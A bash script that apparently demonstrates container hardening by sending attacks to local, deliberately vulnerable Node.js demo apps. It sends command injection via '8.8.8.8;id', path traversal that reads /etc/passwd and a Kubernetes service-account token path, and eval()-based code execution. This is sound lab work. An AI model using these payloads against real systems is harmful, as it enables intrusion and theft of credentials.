#!/bin/bash
# Run the demo attacks against one of the Node.js containers.

usage() {
  cat <<EOF
Usage: $0 <target>

  <target> can be the SERVICE NAME or the PORT:

    app-classic              -> 6661   (classic Node image: has /bin/sh)
    app-distroless           -> 6662   (distroless: no shell)
    app-distroless-hardened  -> 6663   (distroless + AppArmor)

  Examples:
    $0 app-distroless
    $0 6662
EOF
  exit 1
}

[ $# -eq 0 ] && usage

case "$1" in
  app-classic)             PORT=6661 ;;
  app-distroless)          PORT=6662 ;;
  app-distroless-hardened) PORT=6663 ;;
  -h|--help)               usage ;;
  [0-9]*)                  PORT="$1" ;;
  *) echo "Unknown target: '$1'"; echo; usage ;;
esac

echo "=== Attacks against '${1}' (port ${PORT}) ==="

echo -e "\n--- 1. Command Injection  (/attack/command-injection) ---"
echo "Injects a shell command into an unsanitized exec() call."
curl -s -G "http://localhost:${PORT}/attack/command-injection" --data-urlencode "ip=8.8.8.8;id"

echo -e "\n\n--- 2. Path Traversal / LFI  (/attack/path-traversal) ---"
echo "Reads an arbitrary file through an unvalidated file path."
curl -s "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/passwd" | head -n 5

echo -e "\n\n--- 3. Path Traversal: Kubernetes token  (fake, mounted for the demo) ---"
echo "Same LFI, aimed at the service account token path."
curl -s "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token"

echo -e "\n\n--- 4. Arbitrary Code Execution  (/attack/eval-rce) ---"
echo "Executes arbitrary JavaScript through eval() (no shell required)."
curl -s -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=1+1"
echo ""
